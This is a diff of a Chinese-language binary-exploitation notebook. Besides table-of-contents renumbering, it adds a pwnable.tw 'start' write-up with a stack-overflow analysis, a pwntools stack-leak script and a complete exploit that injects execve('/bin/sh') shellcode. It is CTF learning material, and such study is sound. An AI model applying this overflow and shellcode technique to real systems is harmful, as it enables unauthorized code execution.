@@ -111,13 +111,14 @@ Table of Contents
       * [Exploit](#exploit-9)
       * [pwntools Exploit](#pwntools-exploit)
     * [拓展 BPF](#拓展-bpf)
+    * [实战](#实战-6)
     * [参考](#参考-8)
   * [or shellcode injection](#or-shellcode-injection)
     * [介绍](#介绍-9)
     * [cmp与jz](#cmp与jz)
     * [or shellcode](#or-shellcode)
       * [Exploit](#exploit-10)
-    * [实战](#实战-6)
+    * [实战](#实战-7)
     * [参考](#参考-9)
   * [double shellcode injection](#double-shellcode-injection)
   * [mprotect shellcode injection](#mprotect-shellcode-injection)
@@ -125,7 +126,7 @@ Table of Contents
     * [mprotect](#mprotect)
     * [mprotect shellcode](#mprotect-shellcode)
       * [Exploit](#exploit-11)
-    * [实战](#实战-7)
+    * [实战](#实战-8)
     * [参考](#参考-10)
   * [alphanumeric shellcode injection](#alphanumeric-shellcode-injection)
   * [bypass canary](#bypass-canary)
@@ -138,6 +139,7 @@ Table of Contents
     * [SSP leak](#ssp-leak)
     * [劫持\_\_stack\_chk\_fail](#劫持__stack_chk_fail)
     * [利用auxv控制](#利用auxv控制)
+    * [实战](#实战-9)
     * [参考](#参考-11)
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
@@ -147,7 +149,7 @@ Table of Contents
     * [栈迁移](#栈迁移)
       * [Exploit](#exploit-12)
     * [栈劫持](#栈劫持)
-    * [实战](#实战-8)
+    * [实战](#实战-10)
     * [参考](#参考-12)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
@@ -187,13 +189,19 @@ Table of Contents
     * [使用](#使用-3)
   * [LibcSearcher](#libcsearcher)
 * [实战篇](#实战篇)
-  * [2021 蓝帽杯](#2021-蓝帽杯)
-    * [slient](#slient)
+  * [pwnable\.tw](#pwnabletw)
+    * [start](#start)
       * [分析](#分析-1)
       * [Exploit](#exploit-13)
+    * [orw](#orw)
+    * [dubblesort](#dubblesort)
+  * [2021 蓝帽杯](#2021-蓝帽杯)
+    * [slient](#slient)
+      * [分析](#分析-2)
+      * [Exploit](#exploit-14)
   * [2021 长城杯](#2021-长城杯)
     * [K1ng\_in\_h3Ap\_I](#k1ng_in_h3ap_i)
-      * [分析](#分析-2)
+      * [分析](#分析-3)
 * [研究篇](#研究篇)
   * [format string vuln attack \.got](#format-string-vuln-attack-got)
 
@@ -2654,7 +2662,9 @@ o.interactive()
 
 ### 拓展 BPF
 
+### 实战
 
+-   [orw](#orw)
 
 ### 参考
 
@@ -3298,7 +3308,9 @@ gdb调试来看一下, 在scanf处设下断点
 
 ### 利用auxv控制
 
+### 实战
 
+-   [dubblesort](#dubblesort)
 
 ### 参考
 
@@ -3994,7 +4006,104 @@ A获取系统调用号, 如果等于execve的系统调用号的话就跳转到KI
 
 # 实战篇
 
+## pwnable.tw
+
+### start
+
+>   题目地址: https://pwnable.tw/challenge/#1
+
+#### 分析
+
+![image-20220404191837566](Self-help_Clown.assets/image-20220404191837566.png)
+
+程序主要就是一个write和一个read系统调用
+
+![image-20220404192217528](Self-help_Clown.assets/image-20220404192217528.png)
+
+程序什么保护都没有加, 大概率是ret2shellcode类型
+
+![image-20220404193521510](Self-help_Clown.assets/image-20220404193521510.png)
+
+程序刚开始的时候压入了esp, exit也压入栈, 刚好在start的函数返回地址处, read函数有溢出漏洞, 当程序里没有jmp esp之类的指令, 那么只能想办法去泄露栈地址, 我们可以将函数返回地址填为`0x8048087`, 刚好esp指向的是start第一条指令压入的栈地址, 赋值给了write函数第二个参数, 接着就可以把栈地址给打印出来, 这里偏移量通过调试可以看出来buf距离函数返回地址相差0x14
+
+其实通过汇编一可以看出, buf地址一直是esp, 然后在ret指令的前一条指令是
+
+```c
+.text:08048099                 add     esp, 14h
+```
+
+将esp+14h后执行ret指令, 也可以看出来偏移量就是0x14
+
+![screenshots](Self-help_Clown.assets/screenshots-164908049584931.gif)
+
+```python
+from pwn import*
+o = process('./start')
+
+write_addr = 0x8048087
+# leak stack address
+o.recv()
+payload = 'a'*0x14 + p32(write_addr)
+o.send(payload)	# 不能用sendline, 会覆盖那个栈地址, 导致泄露出来的地址有偏差
+stack = u32(o.recv(4))
+print hex(stack)
+o.interactive()
+```
+
+![image-20220404220107969](Self-help_Clown.assets/image-20220404220107969.png)
+
+接下来我们要去计算shellcode注入的地方是哪, 只有知道注入的地方是哪才可以将ret返回地址填入shellcode地址跳转去执行
+
+我们首先要清除, read函数的第二个参数地址是哪, 通过上面的调试可以看出来应该为泄露出来的地址-4处, buf距离ret地址偏移量为0x14, 也就是leak_addr+0x10, 所以shellcode注入的地址应该是leak_addr+0x14
+
+![image-20220404221854365](Self-help_Clown.assets/image-20220404221854365.png)
+
+#### Exploit
+
+```python
+from pwn import*
+o = process('./start')
+context(os='linux', arch='i386')
+
+write_addr = 0x8048087
+# leak stack address
+o.recv()
+payload = 'a'*0x14 + p32(write_addr)
+o.send(payload)	# 不能用sendline, 会覆盖那个栈地址, 导致泄露出来的地址有偏差
+stack = u32(o.recv(4))
+print hex(stack)
+shellcode_addr = stack + 0x14
+payload = 'a'*0x14 + p32(shellcode_addr)
+shellc = '''
+push 0x68732f
+push 0x6e69622f
+push esp
+pop ebx
+xor ecx, ecx
+xor edx, edx
+mov eax, 11
+int 0x80
+'''
+payload += asm(shellc)
+o.sendline(payload)
+o.interactive()
+```
+
+![image-20220404222319088](Self-help_Clown.assets/image-20220404222319088.png)
+
+### orw
+
+>   题目地址: https://pwnable.tw/challenge/#2
+
+
+
+### dubblesort
+
+>   题目地址: https://pwnable.tw/challenge/#4
+
 ## 2021 蓝帽杯
+
+>   题目地址: https://github.com/ctfwiki/ctf_game_history/blob/master/2021/%E8%93%9D%E5%B8%BD%E6%9D%AF.md
 
 ### slient
 
